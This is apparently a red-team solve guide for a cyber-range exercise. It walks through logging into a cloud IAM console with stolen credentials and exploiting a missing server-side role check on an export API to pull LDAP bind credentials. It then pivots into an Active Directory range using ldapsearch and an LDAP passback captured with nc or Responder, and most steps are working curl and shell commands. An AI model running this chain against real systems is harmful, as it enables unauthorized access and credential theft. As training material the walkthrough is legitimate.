# Solve Guide — Red Team
## RNG-CLD-01 | M5 — cld-iam | Broken Access Control → AD Integration Export
**Technique:** T1078.004 / T1199 — Cloud Accounts / Trusted Relationship Abuse  
**Pivot In:** cloud-iam-svc:IAm@CLD!2025 (from M4 image ENV)

## Objective
Authenticate to the PUL Cloud IAM Console as `cloud-iam-svc` (an `iam_user` role account), then exploit a Broken Access Control vulnerability to call the AD integration export API endpoint that is UI-restricted to admins but has no server-side role check — extracting LDAP bind credentials and DC information for the AD range pivot.

## Step 1 — Discover the IAM Console

```bash
nmap -sV -p 8080 11.0.2.50
# 8080/tcp  open  http  PUL Cloud IAM Console

# Curl version check
curl -s http://11.0.2.50:8080/api/v1/version
# {"service": "PUL Cloud IAM Console", "version": "3.1.0"}
```

<img width="1494" height="580" alt="image" src="https://github.com/user-attachments/assets/289cc07f-ab7a-4bf6-9fb7-7cad200e3030" />


Navigate to `http://11.0.2.50:8080` — the IAM Console login page.

<img width="2031" height="433" alt="image" src="https://github.com/user-attachments/assets/f157529e-9119-4264-bf36-7268dec9fcbd" />


## Step 2 — Authenticate with Stolen Credentials

```bash
# Login and capture the JWT token
TOKEN=$(curl -s -X POST http://11.0.2.50:8080/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

echo "Token: ${TOKEN}"
# Non-empty token confirms successful authentication
```

**Role check:** The JWT payload (base64 decoded middle segment) reveals:
```json
{"sub": "cloud-iam-svc", "role": "iam_user", "exp": ...}
```
Role is `iam_user` — not `iam_admin`. The UI will show restricted features.

<img width="2023" height="667" alt="image" src="https://github.com/user-attachments/assets/63e16eee-c88b-4e00-bd77-8b1cddcbb9c7" />


## Step 3 — Enumerate the API

Browse the authenticated dashboard at `http://11.0.2.50:8080/dashboard`. Navigate to **Integrations** — you see an AD integration tile with a 🔒 padlock labeled "Admin only." The UI button is disabled for iam_user accounts.

However, the UI restriction is purely cosmetic JavaScript. The API itself has no server-side role enforcement on the export endpoint.

```bash
# Discover available API routes
curl -s -H "Authorization: Bearer ${TOKEN}" \
    http://11.0.2.50:8080/api/v1/integrations \
    | python3 -m json.tool
# Returns list of integrations including:
# {"id": "int-ad-corp-001", "name": "Corporate AD", "type": "ldap", "status": "active"}
```
<img width="1994" height="422" alt="image" src="https://github.com/user-attachments/assets/04d35866-b67d-4752-b6e3-70285d292a6c" />


## Step 4 — Exploit the Broken Access Control (THE GOAL)

The export endpoint should only be accessible to `iam_admin` role accounts. The server performs no role check:

```bash
# Direct API call — works for ANY authenticated user regardless of role
curl -s -H "Authorization: Bearer ${TOKEN}" \
    "http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export" \
    | python3 -m json.tool
```
<img width="1918" height="318" alt="image" src="https://github.com/user-attachments/assets/5c119998-4db0-4fe5-beb8-b7b95ea90a8b" />


Response:
```json
{
  "integration_id": "int-ad-corp-001",
  "type": "ldap",
  "config": {
    "dc_ip": "33.55.55.137",
    "domain": "cyberange.local",
    "bind_dn": "CN=svc_ldap,CN=Users,DC=cyberange,DC=local",
    "bind_password": "Ld@pB1nd#2025!",
    "base_dn": "DC=cyberange,DC=local",
    "ldap_port": 389,
    "use_ssl": false
  },
  "web_admin_panel": "http://33.55.55.129/admin/"
}
```
<img width="1393" height="891" alt="image" src="https://github.com/user-attachments/assets/9c29597a-c207-439a-a5ad-5cd16c83e11a" />


**Stolen LDAP credentials:**
- Bind DN: `CN=svc_ldap,CN=Users,DC=cyberange,DC=local`
- Bind Password: `Ld@pB1nd#2025!`
- Domain Controller: `33.55.55.137`
- Web admin panel: `http://33.55.55.129/admin/` (SRV08-WEB — AD range entry point)

## Step 5 — Pivot to AD Range via LDAP Passback

With `svc_ldap:Ld@pB1nd#2025!`, proceed to the AD range:

**A) Direct LDAP enumeration:**
```bash
ldapsearch -x -H ldap://33.55.55.137 \
    -D "CN=svc_ldap,CN=Users,DC=cyberange,DC=local" \
    -w 'Ld@pB1nd#2025!' \
    -b "DC=cyberange,DC=local" \
    "(objectClass=user)" sAMAccountName memberOf
```

**B) LDAP Passback via SRV08-WEB admin panel:**
1. Navigate to `http://33.55.55.129/admin/`
2. Login with `svc_ldap:Ld@pB1nd#2025!`
3. Go to LDAP settings → change Server IP to your Kali IP
4. Start listener: `nc -lvnp 389` or `responder -I eth0`
5. Click "Test LDAP Connection" → SRV08-WEB sends bind request → credential captured

## Summary

| Item | Value |
|---|---|
| Vulnerability | Broken Access Control — no server-side role check on export endpoint |
| Endpoint | GET /api/v1/integrations/int-ad-corp-001/export |
| Stolen Creds | svc_ldap:Ld@pB1nd#2025! @ DC 33.55.55.137 |
| AD Entry Point | http://33.55.55.129/admin/ (SRV08-WEB LDAP Passback) |
| MITRE | T1078.004, T1199 |
